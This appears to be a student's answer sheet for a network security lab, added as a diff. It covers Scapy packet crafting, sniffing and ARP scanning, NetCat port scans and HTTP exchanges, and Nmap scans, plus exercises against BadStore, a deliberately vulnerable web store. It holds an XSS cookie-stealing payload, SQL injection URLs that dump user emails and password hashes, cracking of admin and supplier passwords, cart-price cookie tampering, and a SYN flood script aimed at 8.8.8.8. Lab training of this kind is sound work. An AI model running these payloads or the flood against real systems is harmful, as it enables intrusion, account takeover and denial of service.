@@ -1,0 +1,610 @@
+DISCLAIMER::NOT TO BE SHARED PLEASE...LAST IA SILK NOT YET GIVEN..-GENTEL REMINDER--
+
+
+NOTE:[[PASSWORD FOR admin:secret 
+       PASSWORD FOR supplierjoe:iforgot
+       For Scapy type in command prompt
+       For NetCat type in Ubuntu terminal]]
+--
+------
+1]
+a.BadStore’s cart cookie is also an encoded string with a predictable structure XXX:YYY:… etc., and it probably contains information it shouldn’t.
+ Which field of the decoded string could an attacker change to give himself a discount on an item’s price?
+Ans:
+Login as joe@supplier.com -> iforgot
+go to whats new ->add items to cart
+in search bar -> <script>alert(document.cookie)</script>
+After getting the CartID value , and url-decoding it using https://www.urldecoder.org
+ CartID=1527258326%3A1%3A11.5%3A1000; 
+
+After url-decoding 1527258326:1:11.5:1000 
+
+Field 1 : 1527258326 is a unix timestamp 
+Field 2 : “Useless” 
+Field 3 : 11.5 is the price 
+Field 4 : 1000 is the item id. 
+So the attacker needs to edit the price field which is the third order.
+
+ Answer:Field 3
+-----
+
+b.	Using Scapy, create a frame that consists of an Ethernet layer, with an IP layer on top? With the show method, 
+    capture all fields of the frame. 
+    
+Ans: Open cmd prompt(normal)
+ Next,type pip install scapy  //(if not already installed)
+ Then type: scapy //hit enter
+ Type the following 3 cmds below:
+ >>> from scapy.all import *
+ >>> my_frame=Ether()/IP(dst="8.8.8.8")
+ >>> my_frame  //u will get ether type and ip
+ >>> my_frame.show()  //this will show version,flags src...
+
+----- 
+c.	Write a Shell script for port scan using NetCat.
+Ans:Go to seed vm ,open termial and type:
+gedit n.sh //inside the file type as below
+
+#!/bin/bash
+host="www.example.com"
+read -p "Enter the starting port number: " start_port
+read -p "Enter the ending port number: " end_port
+for((port=start_port;port <= end_port;port++))
+	do
+		echo "Scanning port $port ... "
+		nc -zv -w1 "$host" "$port" 2>&1
+	done
+
+
+Now close the file,come back to terminal and type:
+chmod+x n.sh //changing permission
+./n.sh
+Here u will get:Enter the scanning port number : 79 //give 79
+                Enter the scanning port number : 81  //give 81 
+*****************************************************************************************************************************
+2] 
+a.Log in as joe@supplier.com to Badstore— — this is possible in a variety of ways, including SQL injection. 
+Then look at his previous orders and answer the question: What credit card number did he use to make a purchase
+of $46.95? Multiple answers are possible. 
+
+Ans:
+Log in as joe(in Login/Register but not in supplier Login)
+You will see a button on the left , to view joe orders(view previous orders), which will take you to http://192.168.1.111/cgi-bin/badstore.cgi?action=viewprevious
+
+Ctrl+F , after the page has loaded to search for $46.95 We got all credit cards of joe 
+
+Answer: 4111 1111 1111 1111 , 5500 0000 0000 0004
+
+-----    
+b.How to Sniff with Scapy (for 10 packets and show the details of all the packets).
+Ans: Open cmd prompt(normal)
+ Next,type pip install scapy  //(if not already installed)
+ Then type: scapy //hit enter
+ Type the following cmds below:
+ >>> packets=sniff(count=10)
+ >>> packets  /// U WILL GET THIS <Sniffed: TCP:10 UDP:0 ICMP:0 Other:0>
+ >>> packets.summary() //u Will get summary of packets
+ For detailed summary ,use the following cmds
+ >>> for pkt in packets:
+      pkt.show() //watch out for indentation here..u will get detail summary as output
+
+-----
+c.Using NetCat, show how to Communicate with the server using 2 terminals and across systems
+
+Ans: Go to seed vm ,
+ Open 1st termial and type: nc -vlp 1024
+ Open 2nd terminal and type: nc -v localhost 1024 // (start typing) u can see what u type in one 1 terminal reflecting on other
+
+ For doing Across systems://(This has to be done on 2 systems..so take the ip of 1st system for using in the 2nd system..ipconfig)
+ Terminal 1 (Machine a): nc -vlp 1024
+ Terminal 2 on another system: nc  <machina a ip>  1024 //(start typing)
+*****************************************************************************************************************************
+3]
+a.Demonstrate how to perform traceroute in Scapy.
+
+Ans: Open cmd prompt(normal)
+ Next,type pip install scapy  //(if not already installed)
+ Then type: scapy //hit enter
+ Type the following cmd below:
+>>> result,_=traceroute(["www.example.com","www.google.com"],maxttl=20) // u can see emission begins n packets
+
+-----
+b.Using NetCat, show the usage of HTML  Request/Response (HEAD /GET). 
+
+Ans: Go to seed vm ,open termial and type:
+
+gedit a.txt//inside this file type and keep this for quickly copy n pasting
+GET / HTTP/1.1
+Host: example.com
+User-Agent: curl/7.47.0
+Accept:*/*
+
+After typing this inside the text file,come back to terminal n type,    
+
+nc -v example.com 80 //it will show connection success msg
+Soon after the success message copy the lines u typed in the text file and paste it here in terminal like below
+
+GET / HTTP/1.1
+Host: example.com
+User-Agent: curl/7.47.0
+Accept:*/*
+
+This will give the response as output 
+
+Similarly follow the same procedure for HEAD.Use the below lines for it.
+
+HEAD / HTTP/1.1
+Host: example.com
+User-Agent: curl/7.47.0
+Accept:*/*
+
+-----
+c.Using Nmap perform Ping Scan (determine which hosts are up). Also show how to scan a single IP. 
+
+Ans: Open Nmap or Zenmap,
+ Under cmd field type:
+     nmap -sn example.com  and click on scan
+Next again to show for single Ip,
+Under cmd field type:
+    nmap 184.168.112.11 and click on scan
+*****************************************************************************************************************************
+4]
+a.Write a python code using Scapy for creating a Network Scanner (Hint: Create an ARP packet using ARP() method ).
+Ans:Open cmd prompt(normal)
+ Next,type pip install scapy  //(if not already installed)
+ Then type: scapy //hit enter
+ Type the following cmd below:
+     
+from scapy.all import *
+request = ARP()
+request.pdst = '192.168.6.0/24'
+broadcast = Ether()
+broadcast.dst = "ff:ff:ff:ff:ff:ff"
+req_broadcast = broadcast / request
+clients = srp(req_broadcast, timeout=3, verbose=False)[0]
+if not clients:
+    print("No clients found or no response received.")
+else:
+    for element in clients:
+        print(element[1].psrc + " " + element[1].hwsrc) // u will get this output: 192.168.6.149 00:45:e2:c0:b1:fd 192.168.6.81 f6:31:8e:7d:ba:ab
+-----    
+b.Using NetCat, show communication between browser and the server. (for plain text)
+Ans:Go to seed vm ,open termial and type:
+ nc -vlp 1024 //shows the listening output
+Next, Go to browser and type: 127.0.0.1:1024 //hit enter
+Again come back to terminal….type:
+HTTP/1.1 200 OK
+Content-Type:text/html;charset:UTF-8
+Server:nooblinux
+
+<!doctype html>
+<title>trial</title>
+<h1>can u see me></h1> 
+(ctrl+c) //after this check the browser ..u can see the text of <h1> in the broswer
+
+-----
+c.Using Nmap, Scan a range of IPs. Also scan an entire subnet. 
+Ans:Open Nmap or Zenmap,
+ Under cmd field type:
+     nmap 184.168.112.11-16  and click on scan
+Next again ,
+Under cmd field type:
+    nmap 192.168.1.0/24 and click on scan
+
+*****************************************************************************************************************************
+5]
+a. Demonstrate SYN flood attack using Scapy.
+Ans:Open cmd prompt(normal)
+ Next,type pip install scapy  //(if not already installed)
+ Then type: scapy //hit enter
+ Type the following cmds below:
+     
+from scapy.all import *
+target_ip = "8.8.8.8"
+target_port = 443
+
+for i in range(1000):
+    send(IP(dst=target_ip)/TCP(dport=target_port, flags="S"), verbose=False) //code is crct but o/p wont come since many devices r needed
+
+-----
+b.Using NetCat, show communication between browser and the server. (for an image)
+Ans:Go to seed vm ,open termial and type:
+  nc -vlp 1024 //shows the listening output
+Next, Go to browser and type: 127.0.0.1:1024 //hit enter
+Again come back to terminal….type:
+HTTP/1.1 200 OK
+Content-Type:text/html;charset:UTF-8
+Server:nooblinux
+
+<!doctype html>
+<title>trial</title>
+<h1>can u see me></h1> 
+<img src="image address"> // (do copy image location:its not possible in our systems..in lab it will work)
+
+(ctrl+c) //after this check the browser ..u can see the text of <h1> in the broswer and image
+
+-----    
+c.Using Nmap, Scan specific ports. Also show how to scan all 65535 ports.
+Ans:Open Nmap or Zenmap,
+ Under cmd field type:
+     nmap -p 80,443 example.com
+ Also to scan all ports, under cmd field type:
+     nmap -p - example.com
+
+
+*****************************************************************************************************************************    
+6]
+a.BadStore uses cookies to track the contents of the cart, once you’ve added something to it. 
+  What is the key of the cookie used for the cart?
+Ans:
+Login as joe@supplier.com -> iforgot
+go to whats new -> add items to cart
+in search bar -> <script>alert(document.cookie)</script>
+Answer : cartId
+
+-----    
+b.Write a Shell script for port scan using NetCat.
+Ans:Go to seed vm ,open termial and type:
+gedit n.sh //inside the file type as below
+
+#!/bin/bash
+host="www.example.com"
+read -p "Enter the starting port number: " start_port
+read -p "Enter the ending port number: " end_port
+for((port=start_port;port <= end_port;port++))
+	do
+		echo "Scanning port $port ... "
+		nc -zv -w1 "$host" "$port" 2>&1
+	done
+
+
+Now close the file,come back to terminal and type:
+chmod+x n.sh //changing permission
+./n.sh
+Here u will get:Enter the scanning port number : 79 //give 79
+                Enter the scanning port number : 81  //give 81 
+-----
+c.Using Nmap, scan top 1000 ports (default). Also show how to detect service version. 
+Ans:Open Nmap or Zenmap,
+ Under cmd field type:
+    nmap bnmit.org
+Again for showing service version ,under cmd type:    
+    nmap -sV example.com
+*****************************************************************************************************************************     
+7]
+a.BadStore uses cookies to track the contents of the cart, once you’ve added something to it. 
+  What is the key of the cookie used for the cart?
+Ans:
+Login as joe@supplier.com -> iforgot
+go to whats new -> add items to cart
+in search bar -> <script>alert(document.cookie)</script>
+Answer : cartId
+
+-----    
+b.Using Nmap show OS detection. Also demonstrate how to perform Aggressive scan.
+Ans:Open Nmap or Zenmap,
+ Under cmd field type:
+    nmap -O example.com
+ Again for Aggressive scan under cmd type:
+    nmap -A example.com
+
+-----
+c.One of the BadStore pages has a hidden form field that establishes a new user’s privilege level. What is the name of this field?
+Ans:
+Type this link in url:
+
+http://192.168.36.143/cgi-bin/badstore.cgi?searchquery=xx%27+IN+%28itemnum%2Csdesc%2Cldesc%29+union+select+email%2Cpasswd%2C123%2C123+from+userdb+LIMIT+2+--+&action=search&x=16&y=7
+
+From admin field, copy the item, go to md5 reverse and paste it , u will get back the result as secret..
+
+Go to login/register: type admin and secret and login
+
+Then change url to http://192.168.1.111/cgi-bin/badstore.cgi?action=admin
+Click on add users-> do it
+Right Click inspect -> ctrl+F -> type hidden and press enter….value name of the field is password.
+
+***************************************************************************************************************************** 
+8]	  
+a.Demonstrate how to Send ICMP packets in Scapy and show the packet captured using Wireshark to destination 8.8.8.8.
+Ans:Open cmd prompt(normal)
+ Next,type pip install scapy  //(if not already installed)
+ Then type: scapy //hit enter
+ Type the following cmds below:
+>>> frame=Ether()/IP(dst="8.8.8.8")/ICMP()
+>>> frame //U will get this as output ..<Ether  type=IPv4 |<IP  frag=0 proto=icmp dst=8.8.8.8 |<ICMP  |>>>
+After that open wireshark and start capture,and come back to cmd prompt and type
+>>> sendp(frame) //capture the packet in wireshark...apply icmp filter and observe it
+
+-----
+b.Using NetCat, show communication between browser and the server (for an image).
+Ans:Go to seed vm ,open termial and type:
+  nc -vlp 1024 //shows the listening output
+Next, Go to browser and type: 127.0.0.1:1024 //hit enter
+Again come back to terminal….type:
+HTTP/1.1 200 OK
+Content-Type:text/html;charset:UTF-8
+Server:nooblinux
+
+<!doctype html>
+<title>trial</title>
+<h1>can u see me></h1> 
+<img src="image address"> // (do copy image location:its not possible in our systems..in lab it will work)
+
+(ctrl+c) //after this check the browser ..u can see the text of <h1> in the broswer and image
+    
+-----    
+c.How many items for purchase are in BadStore’s database? Use SQL injection on the quick search form field to find out.
+Ans:
+(answer : 16)
+On the search box , type any thing for example just x or type this:
+http://192.168.36.143/cgi-bin/badstore.cgi?searchquery=x&action=search&x=11&y=9
+Next type this in search : 
+  Type the url:
+http://192.168.36.143/cgi-bin/badstore.cgi?searchquery=x%27+union+select+itemnum,+sdesc,+ldesc,+price+from+itemdb+--+&action=search&x=11&y=9
+We can count them manually or type this url:   
+    (type this final url enough ): 
+http://192.168.1.111/cgi-bin/badstore.cgi?searchquery=x%27+union+select+count%28itemnum%29%2Ccount%28itemnum%29%2Ccount%28itemnum%29%2Ccount%28itemnum%29+from+itemdb+--+&action=search&x=11&y=9
+
+*****************************************************************************************************************************     
+9]	  
+a.Demonstrate how to Perform a Port Scan using Scapy tool on target www.example.com.
+Ans:Open cmd prompt(normal)
+ Next,type pip install scapy  //(if not already installed)
+ Then type: scapy //hit enter
+ Type the following cmds below:
+    
+from scapy.all import *
+
+target_ip = "scanme.nmap.org"
+ports = [22, 80]
+for port in ports:
+    pkt = IP(dst=target_ip)/TCP(dport=port, flags="S")
+    resp = sr1(pkt, timeout=1, verbose=0)
+    if resp:
+        if resp.haslayer(TCP) and resp[TCP].flags == "SA":
+            print(f"Port {port} is open")
+        elif resp.haslayer(TCP) and resp[TCP].flags == "RA":
+            print(f"Port {port} is closed")
+        else:
+            print(f"Port {port} is filtered or unknown response")
+    else:
+        print(f"No response from port {port}") // output is: Port 22 is open Port 80 is open
+
+-----    
+b.Using Nmap, Scan for vulnerabilities. Also demonstrate how to save results to a text file.
+Ans:Open Nmap or Zenmap,
+ Under cmd field type these 3 cmd:
+     nmap --script http-vuln-cve2017-8917 example.com
+     nmap --script vulners --script-args mincvss=5.0 example.com
+     nmap -oN "C:\\Users\\Neha\\prart\\scan_result.txt" example.com //saves to desktop
+    
+-----    
+c.What operations are suppliers permitted to do once they have logged into the “suppliers only” area?
+  Use SQL injection to bypass authentication, or find a way to create an account as a supplier. 
+Ans:
+(answer: Upload Price Lists)
+
+Login using admin:secret
+Type this url: http://192.168.36.143/cgi-bin/badstore.cgi?action=admin
+
+The admin panel shows some options , we will select show current users -> do it
+
+joe@supplier.com 62072d95acb588c7ee9d6fa0c6c85155 green Joe SupplierS   take this
+
+get the plain password from: https://md5.gromweb.com/?md5=62072d95acb588c7ee9d6fa0c6c85155 
+After loggin in as a supplier , you will be redirected to : http://192.168.1.111/cgi-bin/badstore.cgi?action=supplierportal
+And you have the option to Upload price Lists So the answer is :Upload Price Lists
+    
+***************************************************************************************************************************** 
+10]	  
+a.Using NetCat, show communication between browser and the server (for an image).
+Ans:Go to seed vm ,open termial and type:
+  nc -vlp 1024 //shows the listening output
+Next, Go to browser and type: 127.0.0.1:1024 //hit enter
+Again come back to terminal….type:
+HTTP/1.1 200 OK
+Content-Type:text/html;charset:UTF-8
+Server:nooblinux
+
+<!doctype html>
+<title>trial</title>
+<h1>can u see me></h1> 
+<img src="image address"> // (do copy image location:its not possible in our systems..in lab it will work)
+
+(ctrl+c) //after this check the browser ..u can see the text of <h1> in the broswer and image
+    
+-----
+b.Using Nmap, Scan a range of IPs. Also scan an entire subnet. 
+Ans:Open Nmap or Zenmap,
+ Under cmd field type:
+ nmap 184.168.112.11-16
+ nmap 192.168.1.0/24    //for entire subset
+    
+-----    
+c.Log in as joe@supplier.com — — this is possible in a variety of ways, including SQL injection.
+  Then look at his previous orders and answer the question: What credit card number did he use to make a purchase of $46.95? 
+  Multiple answers are possible, but we will accept all of them. 
+Ans:
+Log in as joe(in Login/Register but not in supplier Login)
+ You will see a button on the left , to view joe orders(view previous orders), which will take you to http://192.168.1.111/cgi-bin/badstore.cgi?action=viewprevious
+
+Ctrl+F , after the page has loaded to search for $46.95 We got all credit cards of joe 
+
+Answer: 4111 1111 1111 1111 , 5500 0000 0000 0004
+    
+***************************************************************************************************************************** 
+11]	 
+a.Create a simple network monitor that watches for ICMP packets using python function callback in Scapy.
+Ans:Open cmd prompt(normal)
+ Next,type pip install scapy  //(if not already installed)
+ Then type: scapy //hit enter
+ Type the following  cmds below:
+from scapy.all import *
+def packet_callback(packet):
+    if packet[IP].proto == 1:
+        print(f"ICMP packet from {packet[IP].src}")
+
+sniff(prn=packet_callback, filter="icmp", store=0)
+//This will give icmp packets...press enter for total count
+
+-----
+b.Using Nmap, scan the top 1000 ports (default). Also show how to detect service version.
+Ans:Open Nmap or Zenmap,
+ Under cmd field type:
+    nmap bnmit.org
+Again for showing service version ,under cmd type:    
+    nmap -sV example.com
+
+-----
+c.Get administrator privileges and then use the admin action to look at the user database. There are two users whose emails 
+  have the form XXX@whole.biz; what is the XXX portion of either of the two users? For example, if one of the users is 
+  jackie@whole.biz, the right answer is jackie. (The answer is case-sensitive.) 
+Ans:
+
+After logging in with admin account: admin:secret Navigate to : or 
+http://192.168.1.111/cgi-bin/badstore.cgi?action=admin 
+And view users accounts , CTRL+F and search for whole.biz
+We got two matches : fred@whole.biz landon@whole.biz 
+
+Answer: fred , landon 
+    
+    
+*****************************************************************************************************************************  
+12]	  
+a.Identify hosts that are up in a local network using Scapy (hint: ARP)
+Ans:Open cmd prompt(normal)
+ Next,type pip install scapy  //(if not already installed)
+ Then type: scapy //hit enter
+ Type the following  cmds below:
+
+from scapy.all import *
+target_subnet = "192.168.6.0/24" //here take the ip address of windows n replace it
+answered, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_subnet), timeout=2, verbose=False)
+for sent, recieved in answered:
+    print(f"Host Up: {recieved.psrc} MAC: {recieved.hwsrc}") // output u will get is:Host Up: 192.168.6.149 MAC: 00:45:e2:c0:b1:fd
+
+
+-----
+b.Using NetCat show communication between browser and the server (for an image).
+Ans:Go to seed vm ,open termial and type:
+  nc -vlp 1024 //shows the listening output
+Next, Go to browser and type: 127.0.0.1:1024 //hit enter
+Again come back to terminal….type:
+HTTP/1.1 200 OK
+Content-Type:text/html;charset:UTF-8
+Server:nooblinux
+
+<!doctype html>
+<title>trial</title>
+<h1>can u see me></h1> 
+<img src="image address"> // (do copy image location:its not possible in our systems..in lab it will work)
+
+(ctrl+c) //after this check the browser ..u can see the text of <h1> in the broswer and image
+    
+    
+-----
+c.BadStore uses cookies to implement a session key, once you’ve authenticated, and for tracking the contents of the cart, 
+  once you’ve added something to it. You can figure out the cookies in use by BadStore in various ways. 
+  What is the key of the session cookie? 
+Ans:
+Login as admin->secret
+in search box -> <script>alert(document.cookie)</script>
+*****************************************************************************************************************************  
+13]	 
+a.Display the route and measure transit delays of packets across an IP network with Scapy (on www.example.com, www.google.com)
+Ans:Open cmd prompt(normal)
+ Next,type pip install scapy  //(if not already installed)
+ Then type: scapy //hit enter
+ Type the following cmds below:
+ result,_=traceroute(["www.example.com","www.google.com"],maxttl=20) // u can see emission begins n packets
+     
+-----
+b.Using NetCat, show communication between browser and the server(for an image).
+Ans::Go to seed vm ,open termial and type:
+  nc -vlp 1024 //shows the listening output
+Next, Go to browser and type: 127.0.0.1:1024 //hit enter
+Again come back to terminal….type:
+HTTP/1.1 200 OK
+Content-Type:text/html;charset:UTF-8
+Server:nooblinux
+
+<!doctype html>
+<title>trial</title>
+<h1>can u see me></h1> 
+<img src="image address"> // (do copy image location:its not possible in our systems..in lab it will work)
+
+(ctrl+c) //after this check the browser ..u can see the text of <h1> in the broswer and image
+    
+-----    
+c.BadStore uses cookies to track the contents of the cart, once you’ve added something to it.
+  What is the key of the cookie used for the cart?
+Ans:
+Login as joe@supplier.com -> iforgot
+go to whats new -> add items to cart
+in search bar -> <script>alert(document.cookie)</script>
+Answer : cartId
+***************************************************************************************************************************** 
+14]	 
+a.Write a scapy program to carryout SYN flooding attack.
+Ans:Open cmd prompt(normal)
+ Next,type pip install scapy  //(if not already installed)
+ Then type: scapy //hit enter
+ Type the following cmds below:
+     
+from scapy.all import *
+target_ip = "8.8.8.8"
+target_port = 443
+
+for i in range(1000):
+    send(IP(dst=target_ip)/TCP(dport=target_port, flags="S"), verbose=False) //code is crct but o/p wont come since many devices r needed
+
+-----     
+b.BadStore’s session cookie format is poorly designed because it uses a predictable structure. In particular, 
+  it is an encoded string (with a URL-encoded newline at the end) of the form XXX:YYY:ZZZ:etc. 
+  Which are the fields used in the cookie?
+Ans:
+Log in with a supplier account , admin is not recommended for this example
+SSOid=am9lQHN1cHBsaWVyLmNvbTo2MjA3MmQ5NWFjYjU4OGM3ZWU5ZDZmYTBjN mM4NTE1NTpKb2UgU3Vw%0AcGxpZXI6Uw%3D%3D%0A;CartID=1527264632%3A1% 3A11.5%3A1000
+
+Coping the value of session cookie which = am9lQHN1cHBsaWVyLmNvbTo2MjA3MmQ5NWFjYjU4OGM3ZWU5ZDZmYTBjNmM4NT E1NTpKb2UgU3Vw%0AcGxpZXI6Uw%3D%3D%0A 
+
+Navigate to the following website:
+https://www.urldecoder.org/
+
+Paste the value in the box and hit decode.
+Copy the result which is : am9lQHN1cHBsaWVyLmNvbTo2MjA3MmQ5NWFjYjU4OGM3ZWU5ZDZmYTBjNmM4NT E1NTpKb2UgU3VwcGxpZXI6Uw== 
+
+Navigate to this site: https://www.base64decode.org 
+Paste the value and do the same to decode it for the second time
+The final output is : joe@supplier.com:62072d95acb588c7ee9d6fa0c6c85155:Joe supplier:S
+
+Analyzing the value above
+ • The value has MD5 Hash of the password : 62072d95acb588c7ee9d6fa0c6c85155 
+• It has user email address : joe@supplier.com 
+• User’s full name : joe supplier 
+• It contains user’s account role S which stands for Supplier 
+
+Answer: MD5 hash of password ,e-mail address, full name ,role 
+
+-----
+c.BadStore’s cart cookie is also an encoded string with a predictable structure XXX:YYY:… etc., and it probably contains 
+  information it shouldn’t. Which field of the decoded string could an attacker change to give himself a discount on an item’s price?
+Ans:
+Login as joe@supplier.com -> iforgot
+go to whats new ->add items to cart
+in search bar -> <script>alert(document.cookie)</script>
+After getting the CartID value , and url-decoding it using https://www.urldecoder.org
+ CartID=1527258326%3A1%3A11.5%3A1000; 
+
+After url-decoding 1527258326:1:11.5:1000 
+
+Field 1 : 1527258326 is a unix timestamp 
+Field 2 : “Useless” 
+Field 3 : 11.5 is the price 
+Field 4 : 1000 is the item id. 
+So the attacker needs to edit the price field which is the third order.
+
+ Answer:Field 3
+
+*****************************************************************************************************************************     
+
